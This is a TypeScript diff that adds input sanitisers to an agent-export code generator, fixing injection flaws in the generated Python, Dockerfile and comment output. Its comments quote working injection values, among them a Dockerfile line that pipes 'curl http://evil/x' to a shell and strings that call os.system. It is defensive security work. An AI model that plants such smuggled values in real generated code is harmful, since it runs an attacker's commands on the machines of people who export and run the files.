@@ -38,7 +38,73 @@ export function toolDescription(id: string): string {
 export function cleanModelId(model?: string): string {
   const m = (model || "gpt-4o").trim();
   const parts = m.split("/").filter(Boolean);
-  return parts.length ? parts[parts.length - 1] : m;
+  return safeIdentifier(parts.length ? parts[parts.length - 1] : m, "gpt-4o");
+}
+
+/**
+ * Reduce a value to characters that cannot break out of a generated literal.
+ *
+ * EVERY EXPORT INTERPOLATES THESE INTO SOURCE CODE the user is expected to run,
+ * and the values are agent-controlled — an agent can arrive by import, by a
+ * share link, or from a colleague's `agent.json`. Nothing escaped them.
+ * Demonstrated, both working:
+ *
+ *   llm_model = 'gpt-4o", "x": __import__("os").system("id"), "y": "'
+ *     -> AutoGen export emitted a VALID extra dict entry that runs on import.
+ *
+ *   llm_model = 'gpt-4o"\nRUN curl http://evil/x | sh\nENV Z="'
+ *     -> the Dockerfile gained a real RUN instruction, executed at build time.
+ *
+ * So: share an agent, the recipient exports it and runs the file, your code
+ * runs on their machine. That is the export feature working exactly as
+ * intended, which is what makes it worth closing at the source.
+ *
+ * Escaping at each of the ~48 interpolation sites would be a per-language
+ * problem solved forty-eight times. Model ids, providers and tool names all
+ * have a narrow legitimate charset, so they are constrained here instead —
+ * once, for every generator including the swarm exports.
+ */
+export function safeIdentifier(raw: string | undefined, fallback: string): string {
+  // `/` IS PERMITTED. Gateway ids are `google/gemini-3-flash-preview` and the
+  // manifest carries the full name — cleanModelId strips the prefix later, per
+  // generator. A first version of this excluded it and turned every real model
+  // id into `openaigpt-4o`, which my own probe caught: a sanitiser that
+  // mangles all legitimate input is not a safer sanitiser, it is a broken
+  // feature. A slash cannot terminate a quoted literal in Python, TypeScript,
+  // a Dockerfile or YAML, so it costs nothing to allow.
+  const cleaned = (raw ?? "").replace(/[^A-Za-z0-9._:/-]/g, "");
+  return cleaned.slice(0, 120) || fallback;
+}
+
+/**
+ * Make a human-readable string safe to drop into a generated comment or
+ * docstring.
+ *
+ * FOUND BY A TEST WRITTEN FOR SOMETHING ELSE. The agent name is sanitised where
+ * it becomes a Python identifier, and interpolated RAW into the module docstring
+ * two lines above it. A name of
+ *
+ *     x"""\nimport os; os.system("id")\n"""
+ *
+ * produced a file whose first line closed the docstring and whose second line
+ * was executable Python, run on import of the generated module. The same shape
+ * closes a JavaScript block comment (star-slash) and injects a Dockerfile
+ * instruction with a bare newline.
+ *
+ * Unlike safeIdentifier this keeps punctuation and spacing — a name is meant to
+ * stay readable in the header — and removes only what can END the construct it
+ * sits inside.
+ */
+export function safeTitle(raw: string | undefined, fallback = "Agent"): string {
+  const cleaned = (raw ?? "")
+    // Every line terminator JS recognises, including U+2028/U+2029.
+    .replace(/[\r\n\u2028\u2029]+/g, " ")
+    .replace(/"""|'''/g, "”””") // cannot close a Python docstring
+    .replace(/\*\//g, "*∕") // cannot close a JS block comment
+    .replace(/`/g, "'") // cannot close a TS template literal
+    .trim()
+    .slice(0, 120);
+  return cleaned || fallback;
 }
 
 /**
